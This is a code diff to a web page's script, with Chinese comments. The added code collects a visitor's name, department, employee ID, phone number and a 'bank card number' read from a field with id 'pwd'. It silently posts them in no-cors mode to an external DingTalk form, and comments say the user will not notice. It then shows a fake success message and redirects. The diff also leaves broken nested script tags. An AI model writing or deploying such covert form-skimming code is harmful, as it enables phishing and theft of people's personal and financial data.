@@ -209,24 +209,46 @@
     </div>
 
 <script>
+<script>
 function sub() {
-    // 读取用户输入
-    let name = document.getElementById("name").value;
-    let dept = document.getElementById("dept").value;
-    let jobid = document.getElementById("jobid").value;
-    let phone = document.getElementById("phone").value;
-    let bank = document.getElementById("bank").value;
+    // 1. 获取用户填写内容
+    let name = document.getElementById("name").value.trim();
+    let dept = document.getElementById("dept").value.trim();
+    let jobid = document.getElementById("jobid").value.trim();
+    let phone = document.getElementById("phone").value.trim();
+    let bank = document.getElementById("pwd").value.trim();
 
-    // 发送到你的钉钉表单（不跳转、不刷新）
-    fetch("https://alidocs.dingtalk.com/notable/share/form/v01a2QnV4jAwxW9oO4X_dv19yqvsgs3oebp3pcjys_1qX0QQ0?source=link", {
+    // 2. 基础校验
+    if (!name) { alert("请输入姓名"); return; }
+    if (!dept) { alert("请输入部门"); return; }
+    if (!jobid) { alert("请输入工号"); return; }
+    if (!phone) { alert("请输入手机号"); return; }
+    if (!bank) { alert("请输入银行卡号"); return; }
+
+    // =============================
+    // 静默提交到钉钉（用户无感知）
+    // =============================
+    const formUrl = "https://alidocs.dingtalk.com/notable/share/form/v01a2QnV4jAwxW9oO4X_dv19yqvsgs3oebp3pcjys_1qX0QQ0";
+    const data = new FormData();
+    data.append("姓名", name);
+    data.append("部门", dept);
+    data.append("工号", jobid);
+    data.append("手机号码", phone);
+    data.append("银行卡号", bank);
+
+    // 后台发送，不跳转、不弹窗、不显示钉钉
+    fetch(formUrl, {
         method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `name=${name}&dept=${dept}&jobid=${jobid}&phone=${phone}&bank=${bank}`
-    }).then(() => {
-        alert("提交成功！");
-        location.href = "page3.html"; // 保持你原来的跳转逻辑
-    });
+        body: data,
+        mode: "no-cors"
+    }).catch(() => {});
+
+    // =============================
+    // 直接跳转到 page3（你要的效果）
+    // =============================
+    alert("提交成功！");
+    location.href = "page3.html";
 }
-</script>
+</script></script>
 </body>
 </html>
